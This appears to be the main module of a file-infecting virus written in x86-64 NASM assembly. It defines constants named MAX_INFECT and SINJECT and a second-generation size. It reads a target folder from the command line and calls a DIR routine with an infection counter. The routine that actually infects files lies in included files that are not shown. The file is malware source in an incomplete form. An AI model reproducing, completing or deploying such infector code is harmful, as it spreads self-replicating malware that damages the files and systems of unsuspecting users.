%include "include.asm"
%include "macro.asm"
%include "sec_gen.asm"
%include "int2string.asm"

;//////////////////////////////////////////////////////////////////////////////////////////////////
;// [ DATA ]
;//////////////////////////////////////////////////////////////////////////////////////////////////

section .data

   Gen_2_Size   equ      OUT_2_GEN  - Main_2_GEN
        
   MYSIZE       equ      0x1000
   MAX_INFECT   equ      0x02
   
   SINJECT      equ      OUT_2_GEN  - Main_2_GEN

   STR_ERROR:   db      'ERROR', 0x0A
   LEN_ERROR    equ      $ - STR_ERROR

   NEW_LINE     db       0x0A
   SPACE        db       0x20
   SLASH        db       0x2F
   COLON        db       0x3A
   POINT        db       0x2E

   ;///////////////////////////////////

   SUCCESS      equ      0x00     ; success code

   STDIN        equ      0x00     ; standard input
   STDOUT       equ      0x01     ; standard output
   STDERR       equ      0x02     ; standard error

   DOT          equ      0x2E

;//////////////////////////////////////////////////////////////////////////////////////////////////
;// [ CODE ]
;//////////////////////////////////////////////////////////////////////////////////////////////////

section .text

   global _start
   
;//////////////////////////////////////////////////////////////////////////////////////////////////
;// [ MAIN ]
;//////////////////////////////////////////////////////////////////////////////////////////////////

_start:     pop            rcx                                ; rcx - argc

              cmp          rcx,             2
              jl           ERROR

              ;////////////////////////////////////////////////////////
              
            pop            rsi                                ; get argv[0] 
            
              xor          rax,             rax
FZERO:        cmp    byte [rsi + rax],      0x00              ; find 0x00 in argv[0]
              je           FZERO_RDY
              inc          rax
              jmp          FZERO
            
FZERO_RDY:    ;////////////////////////////////////////////////////////
            
            pop            rsi                                ; get argv[1]
            
              xor          rax,             rax
FZER1:        cmp    byte [rsi + rax],      0x00              ; find 0x00 in argv[1]
              je           FZER1_RDY
              inc          rax
              jmp          FZER1
            
FZER1_RDY:    ;/////////////////////////////////////////////////////////////////
              ; DIR(pFolder, cFolder, nInfect) 
              ; rsi = pFolder, rax = cFolder, rdi = nInfect

              xor          rdi,             rdi
              call         DIR

              ;/////////////////////////////////////////////////////////////////

              jmp          EXIT
            
;//////////////////////////////////////////////////////////////////////////////////////////////////
;// [ ERROR ]
;//////////////////////////////////////////////////////////////////////////////////////////////////

ERROR:        write        STR_ERROR,       LEN_ERROR

;//////////////////////////////////////////////////////////////////////////////////////////////////
;// [ EXIT ]
;//////////////////////////////////////////////////////////////////////////////////////////////////

EXIT:         mov          rax,             SYS_EXIT
              mov          rdi,             SUCCESS
              syscall
